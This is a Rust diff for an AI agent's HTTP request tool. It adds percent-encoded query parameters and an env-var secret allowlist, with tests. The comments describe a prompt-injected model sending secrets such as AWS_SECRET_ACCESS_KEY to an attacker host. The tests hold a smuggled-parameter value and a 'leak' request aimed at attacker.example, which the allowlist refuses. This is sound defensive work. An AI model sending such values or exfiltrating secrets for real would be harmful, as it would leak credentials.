@@ -12,7 +12,7 @@ use async_trait::async_trait;
 use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
 use serde_json::{json, Value};
 
-use flux_core::{Error, Result};
+use flux_core::{percent_encode_component, Error, Result};
 use flux_runtime::{Tool, ToolContext, ToolResult};
 use flux_spec::{
     AccessKind, Effect, Idempotency, Intent, IntentBehavior, IntentCertainty, IntentRole,
@@ -84,9 +84,11 @@ impl Tool for HttpRequestTool {
             description: "Make an arbitrary HTTP(S) request (any method, headers, and body) and \
                 return the status, response headers, and body. Use this for APIs and raw protocol \
                 access; to read a web page as a readable document prefer `web.fetch`. \
-                Private/loopback addresses are blocked unless the `web` egress scope grants them. A \
-                header value may be a secret reference `{\"$secret\": \"ENV_NAME\"}`, resolved from \
-                the environment and never shown — but only for env-var names the operator has \
+                Private/loopback addresses are blocked unless the `web` egress scope grants them. \
+                Pass query parameters as the `query` record — each value is percent-encoded, so \
+                never build a query by formatting values into the `url`. A header or query value \
+                may be a secret reference `{\"$secret\": \"ENV_NAME\"}`, resolved from the \
+                environment and never shown — but only for env-var names the operator has \
                 allowlisted; any other name is refused."
                 .into(),
             input_schema: json!({
@@ -94,6 +96,11 @@ impl Tool for HttpRequestTool {
                 "properties": {
                     "url": {"type": "string", "description": "The absolute http(s) URL to request."},
                     "method": {"type": "string", "description": "HTTP method (default GET)."},
+                    "query": {
+                        "type": "object",
+                        "description": "Query parameters. Each value (string, number, boolean, or a secret reference {\"$secret\": \"ENV_NAME\"}) is percent-encoded before it is appended, so a value carrying & or = cannot add a parameter. A null value is omitted; false and 0 are sent. A key already present in the url is an error.",
+                        "additionalProperties": true
+                    },
                     "headers": {
                         "type": "object",
                         "description": "Request headers. A value may be a string or a secret reference {\"$secret\": \"ENV_NAME\"}.",
@@ -119,7 +126,7 @@ impl Tool for HttpRequestTool {
         params
             .get("url")
             .and_then(Value::as_str)
-            .map(|s| vec![s.to_string()])
+            .map(|url| vec![reported_url(url, params)])
             .unwrap_or_default()
     }
 
@@ -129,7 +136,7 @@ impl Tool for HttpRequestTool {
             set.push(Intent {
                 behavior: IntentBehavior::NetworkFetch,
                 target: IntentTarget::Url {
-                    url: url.to_string(),
+                    url: reported_url(url, params),
                 },
                 role: IntentRole::ReadTarget,
                 certainty: IntentCertainty::Certain,
@@ -151,10 +158,33 @@ impl Tool for HttpRequestTool {
         let method = reqwest::Method::from_bytes(method_str.as_bytes())
             .map_err(|_| Error::Other(format!("http.request: invalid method {method_str:?}")))?;
 
+        // The structured query. Resolved and appended *before* the guard runs, so the guard — and
+        // the pinning, and the redirect re-guard — all see the URL that actually goes on the wire.
+        let mut resolved_query = Vec::new();
+        for (key, value) in query_fields(&params)? {
+            let text = match value {
+                QueryValue::Text(text) => text,
+                QueryValue::Secret(name) => {
+                    let secret = resolve_secret_env(&name, ctx, &self.allowed_secrets)?;
+                    // The wire carries the *encoded* spelling, and the redactor matches literally,
+                    // so both forms are registered — otherwise a percent-encoded token could
+                    // survive in a guard/transport error message that quotes the URL.
+                    let encoded = percent_encode_component(&secret);
+                    ctx.redactor.add_secret(secret.clone());
+                    if encoded != secret {
+                        ctx.redactor.add_secret(encoded);
+                    }
+                    secret
+                }
+            };
+            resolved_query.push((key, text));
+        }
+        let target = append_query(raw, &resolved_query)?;
+
         // Guard egress (SSRF): resolve the host + block private ranges unless the `web` scope grants
         // them, and capture the vetted addresses so the connection is pinned to them (no rebinding).
         // Runs before any bytes leave the process.
-        let (url, pinned) = flux_system::net::guard_url_scoped_pinned(raw, &self.private_net)?;
+        let (url, pinned) = flux_system::net::guard_url_scoped_pinned(&target, &self.private_net)?;
 
         let timeout = params
             .get("timeout")
@@ -226,27 +256,10 @@ impl Tool for HttpRequestTool {
     }
 }
 
-/// A header value: a plain string, or the secret marker `{"$secret": "ENV_NAME"}`. A secret
-/// reference is resolved from the environment (and seeded into the redactor) **only if `NAME` is on
-/// the caller-configured allowlist** — otherwise it is refused before the value is read, so a
-/// prompt-injected model cannot name an arbitrary env var (`AWS_SECRET_ACCESS_KEY`, …) and exfiltrate
-/// it to an attacker host in one call (C-76). Any other shape is a caller error.
+/// A header value: a plain string, or the secret marker `{"$secret": "ENV_NAME"}`.
 fn resolve_header_value(val: &Value, ctx: &ToolContext, allowed: &[String]) -> Result<String> {
     if let Some(name) = as_secret_ref(val) {
-        if !allowed.iter().any(|a| a == name) {
-            return Err(Error::Other(format!(
-                "http.request: secret env var `{name}` is not on the allowlist and will not be \
-                 resolved. Add it to `[web] allowed_secrets` (or the FLUX_WEB_SECRET_ALLOW env var) \
-                 to permit `{{\"$secret\": \"{name}\"}}`."
-            )));
-        }
-        let resolved = std::env::var(name).map_err(|_| {
-            Error::Other(format!(
-                "http.request: secret env var `{name}` is not set (referenced via {{\"$secret\": \"{name}\"}})"
-            ))
-        })?;
-        ctx.redactor.add_secret(resolved.clone());
-        return Ok(resolved);
+        return resolve_secret_env(name, ctx, allowed);
     }
     match val {
         Value::String(s) => Ok(s.clone()),
@@ -255,6 +268,198 @@ fn resolve_header_value(val: &Value, ctx: &ToolContext, allowed: &[String]) -> R
                 .into(),
         )),
     }
+}
+
+/// Read env var `name` and seed it into the redactor — **only if `name` is on the
+/// caller-configured allowlist**. Otherwise it is refused before the value is read, so a
+/// prompt-injected model cannot name an arbitrary env var (`AWS_SECRET_ACCESS_KEY`, …) and
+/// exfiltrate it to an attacker host in one call (C-76). Shared by the header and query paths.
+fn resolve_secret_env(name: &str, ctx: &ToolContext, allowed: &[String]) -> Result<String> {
+    if !allowed.iter().any(|a| a == name) {
+        return Err(Error::Other(format!(
+            "http.request: secret env var `{name}` is not on the allowlist and will not be \
+             resolved. Add it to `[web] allowed_secrets` (or the FLUX_WEB_SECRET_ALLOW env var) \
+             to permit `{{\"$secret\": \"{name}\"}}`."
+        )));
+    }
+    let resolved = std::env::var(name).map_err(|_| {
+        Error::Other(format!(
+            "http.request: secret env var `{name}` is not set (referenced via {{\"$secret\": \"{name}\"}})"
+        ))
+    })?;
+    ctx.redactor.add_secret(resolved.clone());
+    Ok(resolved)
+}
+
+/// A parsed `query` field value: a literal scalar already rendered as text, or a secret reference
+/// that only the execute path is allowed to resolve.
+#[derive(Debug)]
+enum QueryValue {
+    Text(String),
+    /// The env-var name from `{"$secret": "ENV_NAME"}`.
+    Secret(String),
+}
+
+/// Parse the `query` argument into fields, in sorted key order (`serde_json::Map` is a `BTreeMap`
+/// in this build, so one call always builds one URL — a query that reordered between runs could
+/// not be cached or matched against an allow-list entry).
+///
+/// The scalar rules are L-101's, deliberately, so a body and a query behave the same way:
+///
+/// - **A `null` field is omitted**, which is what lets an unsupplied optional parameter mean "do
+///   not send this" without a `when` guard per field.
+/// - **`false` and `0` are values and are sent** — they are not "unset".
+/// - **A nested field is an error.** A query string has no agreed nesting convention (`a[b]`,
+///   `a.b`, repeated `a=`), and a key a vendor does not recognize is accepted and *ignored*,
+///   answering `200` — the worst failure available. Refuse rather than guess.
+///
+/// Nothing is encoded here and no environment is read: this runs on the `permission_subjects` /
+/// `intents` path too, which must not touch a secret.
+fn query_fields(params: &Value) -> Result<Vec<(String, QueryValue)>> {
+    let Some(query) = params.get("query") else {
+        return Ok(Vec::new());
+    };
+    if query.is_null() {
+        return Ok(Vec::new());
+    }
+    let fields = query.as_object().ok_or_else(|| {
+        Error::Other(format!(
+            "http.request: `query` must be a record of scalar parameters, got {}",
+            shape_word(query)
+        ))
+    })?;
+    let mut out = Vec::with_capacity(fields.len());
+    for (key, value) in fields {
+        let parsed = match value {
+            Value::Null => continue,
+            Value::String(text) => QueryValue::Text(text.clone()),
+            Value::Bool(flag) => QueryValue::Text(flag.to_string()),
+            Value::Number(number) => QueryValue::Text(number.to_string()),
+            Value::Object(_) | Value::Array(_) => match as_secret_ref(value) {
+                Some(name) => QueryValue::Secret(name.to_string()),
+                None => {
+                    return Err(Error::Other(format!(
+                        "http.request: query parameter `{key}` is {}, and a query string has no \
+                         agreed nesting convention — a flattened guess is a parameter the vendor \
+                         accepts and ignores. Send the flat spelling the vendor documents, one \
+                         field per parameter",
+                        shape_word(value)
+                    )))
+                }
+            },
+        };
+        out.push((key.clone(), parsed));
+    }
+    Ok(out)
+}
+
+/// What a value *is*, for a diagnostic that must name the shape rather than dump the value — a
+/// query parameter routinely carries a token or a customer identifier. Mirrors `flux-lang`'s
+/// `shape_word`, which the form encoder uses for the same reason.
+fn shape_word(value: &Value) -> &'static str {
+    match value {
+        Value::Null => "null",
+        Value::Bool(_) => "a boolean",
+        Value::Number(_) => "a number",
+        Value::String(_) => "text",
+        Value::Array(_) => "a list",
+        Value::Object(_) => "a record",
+    }
+}
+
+/// Append `fields` to `raw` as percent-encoded `k=v` pairs.
+///
+/// **Who owns the `?`:** this function does, and it picks the separator — `?` when the URL has no
+/// query yet, `&` when it already does. That is the rule the connector pack's credential placement
+/// settled and the one every other appender in the tree follows; contradicting it would put two
+/// `?` separators on a URL whose query the vendor then parses as part of a value.
+///
+/// A fragment is not part of the query, so it is split off, the parameters go before it, and it is
+/// put back — otherwise `https://h/p#frag` would grow a `?` *inside* the fragment and send nothing.
+///
+/// **A key already present in the URL is an error.** A repeated parameter is resolved differently
+/// by every server (first wins, last wins, or a list), so silently emitting both would make the
+/// request's meaning depend on the vendor — exactly the ambiguity this story exists to remove.
+/// (The `query` record itself cannot carry a duplicate: it is a JSON object.)
+fn append_query(raw: &str, fields: &[(String, String)]) -> Result<String> {
+    if fields.is_empty() {
+        return Ok(raw.to_string());
+    }
+    let (base, fragment) = match raw.split_once('#') {
+        Some((base, fragment)) => (base, Some(fragment)),
+        None => (raw, None),
+    };
+    let existing: Vec<&str> = base
+        .split_once('?')
+        .map(|(_, query)| query)
+        .unwrap_or_default()
+        .split('&')
+        .filter(|pair| !pair.is_empty())
+        .map(|pair| pair.split('=').next().unwrap_or(pair))
+        .collect();
+
+    let mut out = String::from(base);
+    // `None` when the URL already ends on a separator, so `…?` + `a=1` stays one `?`.
+    let mut separator = if !base.contains('?') {
+        Some('?')
+    } else if base.ends_with('?') || base.ends_with('&') {
+        None
+    } else {
+        Some('&')
+    };
+    for (key, value) in fields {
+        let encoded_key = percent_encode_component(key);
+        if existing
+            .iter()
+            .any(|present| *present == encoded_key || *present == key)
+        {
+            return Err(Error::Other(format!(
+                "http.request: query parameter `{key}` is already present in `url`. A repeated \
+                 parameter means something different on every server (first wins, last wins, or a \
+                 list), so this refuses rather than pick one — set `{key}` in `query` or in the \
+                 URL, not both."
+            )));
+        }
+        if let Some(separator) = separator {
+            out.push(separator);
+        }
+        separator = Some('&');
+        out.push_str(&encoded_key);
+        out.push('=');
+        out.push_str(&percent_encode_component(value));
+    }
+    if let Some(fragment) = fragment {
+        out.push('#');
+        out.push_str(fragment);
+    }
+    Ok(out)
+}
+
+/// The URL an egress allow-list and the evidence log are shown: the **encoded** URL that will go on
+/// the wire — so a subject reflects the request as sent, not the pre-query template.
+///
+/// Two deliberate departures, both forced by `permission_subjects` being infallible:
+///
+/// - **A query parameter whose value is a `{"$secret": …}` reference is left out entirely.** This
+///   function cannot resolve a secret (it has no `ToolContext`, so no redactor to register it
+///   with), and a subject is persisted and matched against grants — so it reports the
+///   *unauthenticated* URL, the same property the connector pack preserves for a query-placed
+///   credential.
+/// - **A malformed `query` falls back to the raw `url`.** `execute` rejects the same input with a
+///   real diagnostic before any byte leaves the process, so no request this under-reports is ever
+///   actually made.
+fn reported_url(raw: &str, params: &Value) -> String {
+    let Ok(fields) = query_fields(params) else {
+        return raw.to_string();
+    };
+    let public: Vec<(String, String)> = fields
+        .into_iter()
+        .filter_map(|(key, value)| match value {
+            QueryValue::Text(text) => Some((key, text)),
+            QueryValue::Secret(_) => None,
+        })
+        .collect();
+    append_query(raw, &public).unwrap_or_else(|_| raw.to_string())
 }
 
 /// Parse the `FLUX_WEB_SECRET_ALLOW` env var into a list of permitted secret env-var names
@@ -349,6 +554,34 @@ mod tests {
             }
         });
         format!("http://{addr}")
+    }
+
+    /// A one-shot HTTP server that also reports the raw request bytes it received. Returns its
+    /// base URL plus a receiver for the request text, so a test can assert on the request *line*
+    /// (i.e. what actually went on the wire) rather than on the response.
+    async fn capture_request() -> (String, tokio::sync::oneshot::Receiver<String>) {
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        let (seen_tx, seen_rx) = tokio::sync::oneshot::channel();
+        tokio::spawn(async move {
+            if let Ok((mut sock, _)) = listener.accept().await {
+                let mut buf = vec![0u8; 8192];
+                let n = sock.read(&mut buf).await.unwrap_or(0);
+                let _ = seen_tx.send(String::from_utf8_lossy(&buf[..n]).into_owned());
+                let _ = sock
+                    .write_all(
+                        b"HTTP/1.1 200 OK\r\ncontent-length: 2\r\nconnection: close\r\n\r\nok",
+                    )
+                    .await;
+                let _ = sock.flush().await;
+            }
+        });
+        (format!("http://{addr}"), seen_rx)
+    }
+
+    /// The first line of a captured request (`GET /path?query HTTP/1.1`).
+    fn request_line(request: &str) -> String {
+        request.lines().next().unwrap_or_default().to_string()
     }
 
     /// Two one-shot servers: the first redirects to the second, which returns `final_body` and
@@ -587,6 +820,264 @@ mod tests {
         assert!(
             msg.contains("allowlist") && !msg.contains("exfiltrate-me"),
             "refusal must name the allowlist and never leak the value: {msg}"
+        );
+    }
+
+    /// C-303 — the injection this story closes. A query value carrying `&injected=1` (plus `#`,
+    /// `=`, a space and a non-ASCII character) must arrive as **one** encoded parameter.
+    ///
+    /// The first half of the test is the hazard itself: the only spelling available before this
+    /// story was to interpolate the value into the URL, and that puts a second, attacker-chosen
+    /// parameter on the wire. The second half is the `query` map, which must not.
+    #[tokio::test]
+    async fn query_value_cannot_inject_additional_parameters() {
+        const HOSTILE: &str = "puppies&injected=1#frag = ü";
+
+        // The hazard, for the record: interpolated into the URL, the value *is* two parameters.
+        let (base, seen) = capture_request().await;
+        let t = tool(PrivateNetAllow::Any);
+        t.execute(
+            &ctx(),
+            json!({ "url": format!("{base}/search?q={HOSTILE}") }),
+        )
+        .await
+        .unwrap();
+        let interpolated = request_line(&seen.await.unwrap());
+        assert!(
+            interpolated.contains("injected=1") && !interpolated.contains("%26injected"),
+            "the interpolated spelling smuggles a second parameter (that is the bug): \
+             {interpolated}"
+        );
+
+        // The fix: the same value handed to the structured `query` map is one encoded parameter.
+        let (base, seen) = capture_request().await;
+        t.execute(
+            &ctx(),
+            json!({ "url": format!("{base}/search"), "query": { "q": HOSTILE } }),
+        )
+        .await
+        .unwrap();
+        let line = request_line(&seen.await.unwrap());
+        assert!(
+            line.contains("q=puppies%26injected%3D1%23frag%20%3D%20%C3%BC"),
+            "every reserved byte percent-encoded per RFC 3986 (`&` `=` `#`, space as %20, \
+             non-ASCII as UTF-8): {line}"
+        );
+        assert!(
+            !line.contains("&injected") && !line.contains("&"),
+            "exactly one parameter reached the transport — no `&` separator was introduced by the \
+             value: {line}"
+        );
+    }
+
+    /// L-101's rule, applied to the query: `null` means "do not send this parameter", but `false`
+    /// and `0` are values. Getting this backwards silently drops a `?active=false` filter.
+    #[tokio::test]
+    async fn query_omits_a_null_but_sends_false_and_zero() {
+        let (base, seen) = capture_request().await;
+        tool(PrivateNetAllow::Any)
+            .execute(
+                &ctx(),
+                json!({
+                    "url": format!("{base}/items"),
+                    "query": { "active": false, "cursor": null, "offset": 0, "ratio": 1.5 }
+                }),
+            )
+            .await
+            .unwrap();
+        let line = request_line(&seen.await.unwrap());
+        // Sorted key order, so the URL a given record produces is stable run to run.
+        assert!(
+            line.starts_with("GET /items?active=false&offset=0&ratio=1.5 "),
+            "false and 0 are sent, null is omitted, keys are sorted: {line}"
+        );
+        assert!(
+            !line.contains("cursor"),
+            "a null parameter is omitted: {line}"
+        );
+    }
+
+    /// A URL that already carries a `?` must not grow a second one — the appender owns the
+    /// separator and switches to `&`.
+    #[tokio::test]
+    async fn query_appends_to_a_url_that_already_has_a_question_mark() {
+        let (base, seen) = capture_request().await;
+        tool(PrivateNetAllow::Any)
+            .execute(
+                &ctx(),
+                json!({ "url": format!("{base}/s?page=2"), "query": { "q": "cats" } }),
+            )
+            .await
+            .unwrap();
+        let line = request_line(&seen.await.unwrap());
+        assert!(
+            line.starts_with("GET /s?page=2&q=cats "),
+            "the existing query keeps the `?` and the appended parameter uses `&`: {line}"
+        );
+        assert_eq!(line.matches('?').count(), 1, "exactly one `?`: {line}");
+    }
+
+    /// The `?`-ownership rule as a unit, including the two spellings a hand-built URL arrives in
+    /// (a bare trailing `?`, and a fragment that must stay behind the query).
+    #[test]
+    fn append_query_owns_the_separator_and_keeps_the_fragment_last() {
+        let one = [("a".to_string(), "1".to_string())];
+        assert_eq!(
+            append_query("https://h/p", &one).unwrap(),
+            "https://h/p?a=1"
+        );
+        assert_eq!(
+            append_query("https://h/p?x=0", &one).unwrap(),
+            "https://h/p?x=0&a=1"
+        );
+        // A URL already ending on a separator must not gain a second one.
+        assert_eq!(
+            append_query("https://h/p?", &one).unwrap(),
+            "https://h/p?a=1"
+        );
+        assert_eq!(
+            append_query("https://h/p?x=0&", &one).unwrap(),
+            "https://h/p?x=0&a=1"
+        );
+        // The fragment is not part of the query and stays last.
+        assert_eq!(
+            append_query("https://h/p#frag", &one).unwrap(),
+            "https://h/p?a=1#frag"
+        );
+        // No fields at all leaves the URL byte-identical.
+        assert_eq!(
+            append_query("https://h/p#frag", &[]).unwrap(),
+            "https://h/p#frag"
+        );
+    }
+
+    /// A key supplied both in the URL and in `query` is refused rather than sent twice: a repeated
+    /// parameter is first-wins on some servers and last-wins on others, so "last wins" is not a
+    /// decision this op is entitled to make on the caller's behalf.
+    #[tokio::test]
+    async fn a_duplicate_query_key_is_an_error() {
+        let err = tool(PrivateNetAllow::Any)
+            .execute(
+                &ctx(),
+                json!({ "url": "https://example.com/s?q=first", "query": { "q": "second" } }),
+            )
+            .await
+            .expect_err("a key already in the URL must be refused, not appended");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("`q` is already present") && msg.contains("refuses"),
+            "the refusal names the key and says why: {msg}"
+        );
+    }
+
+    /// A nested value has no agreed query spelling, so it is refused — and the diagnostic names the
+    /// shape, never the value (a query parameter routinely carries a customer identifier).
+    #[test]
+    fn a_nested_query_value_is_refused_without_naming_the_value() {
+        let err = query_fields(&json!({ "query": { "filter": { "id": "cus_secret" } } }))
+            .expect_err("a nested query value must be refused");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("`filter`") && msg.contains("a record"),
+            "{msg}"
+        );
+        assert!(
+            !msg.contains("cus_secret"),
+            "the value must not leak: {msg}"
+        );
+    }
+
+    /// The egress allow-list and the evidence log must see the URL as sent — encoded query and all
+    /// — not the pre-query template.
+    #[test]
+    fn permission_subjects_and_the_intent_report_the_encoded_url() {
+        let t = tool(PrivateNetAllow::None);
+        let params = json!({
+            "url": "https://api.example.com/search",
+            "query": { "q": "a&b", "page": 2 }
+        });
+        let expected = "https://api.example.com/search?page=2&q=a%26b";
+        assert_eq!(t.permission_subjects(&params), vec![expected.to_string()]);
+        let set = t.intents(&params);
+        let intent = set.intents.first().expect("one intent");
+        assert!(
+            matches!(&intent.target, IntentTarget::Url { url } if url == expected),
+            "the NetworkFetch intent carries the encoded URL: {:?}",
+            intent.target
+        );
+        assert!(matches!(intent.behavior, IntentBehavior::NetworkFetch));
+    }
+
+    /// A query-placed credential goes on the wire but **not** into a subject: `permission_subjects`
+    /// cannot fail, so it cannot consult a redactor, and a subject is persisted and matched against
+    /// grants. Reporting the unauthenticated URL is the property the connector pack preserves and
+    /// this must not regress.
+    #[tokio::test]
+    async fn a_query_placed_credential_stays_out_of_the_subject_and_is_redacted() {
+        // A credential whose encoded spelling differs from its raw one — that is the case a
+        // redactor seeded only with the raw value would miss.
+        std::env::set_var("FLUX_WEB_TEST_QUERY_KEY", "sk-live/99 99");
+        let params = json!({
+            "url": "https://api.example.com/v1/x",
+            "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" }, "q": "hi" }
+        });
+        let t = tool_allowing(PrivateNetAllow::Any, &["FLUX_WEB_TEST_QUERY_KEY"]);
+        let subjects = t.permission_subjects(&params);
+        assert_eq!(
+            subjects,
+            vec!["https://api.example.com/v1/x?q=hi".to_string()]
+        );
+        assert!(
+            !subjects[0].contains("api_key") && !subjects[0].contains("sk-live"),
+            "neither the credential nor its parameter reaches a subject: {subjects:?}"
+        );
+
+        // …but it does reach the wire, encoded, and both spellings are registered with the
+        // redactor so a quoted URL in an error can never carry it.
+        let (base, seen) = capture_request().await;
+        let c = ctx();
+        t.execute(
+            &c,
+            json!({
+                "url": format!("{base}/v1/x"),
+                "query": { "api_key": { "$secret": "FLUX_WEB_TEST_QUERY_KEY" } }
+            }),
+        )
+        .await
+        .unwrap();
+        let line = request_line(&seen.await.unwrap());
+        assert!(
+            line.contains("api_key=sk-live%2F99%2099"),
+            "the credential is sent, encoded: {line}"
+        );
+        for spelling in ["sk-live/99 99", "sk-live%2F99%2099"] {
+            let scrubbed = c.redactor.redact(&format!("url: {spelling} end"));
+            assert!(
+                !scrubbed.contains(spelling),
+                "the {spelling} spelling must be redacted: {scrubbed}"
+            );
+        }
+    }
+
+    /// The allowlist gate is the same one headers go through — a `$secret` in a query parameter
+    /// naming a non-allowlisted var is refused before its value is read (C-76).
+    #[tokio::test]
+    async fn a_non_allowlisted_secret_in_a_query_parameter_is_refused() {
+        std::env::set_var("FLUX_WEB_STOLEN_QUERY_TOKEN", "exfiltrate-me-too");
+        let err = tool_allowing(PrivateNetAllow::Any, &[])
+            .execute(
+                &ctx(),
+                json!({
+                    "url": "https://attacker.example/",
+                    "query": { "leak": { "$secret": "FLUX_WEB_STOLEN_QUERY_TOKEN" } }
+                }),
+            )
+            .await
+            .expect_err("a non-allowlisted secret ref must be refused, not sent");
+        let msg = err.to_string();
+        assert!(
+            msg.contains("allowlist") && !msg.contains("exfiltrate-me-too"),
+            "refusal names the allowlist and never leaks the value: {msg}"
         );
     }
 
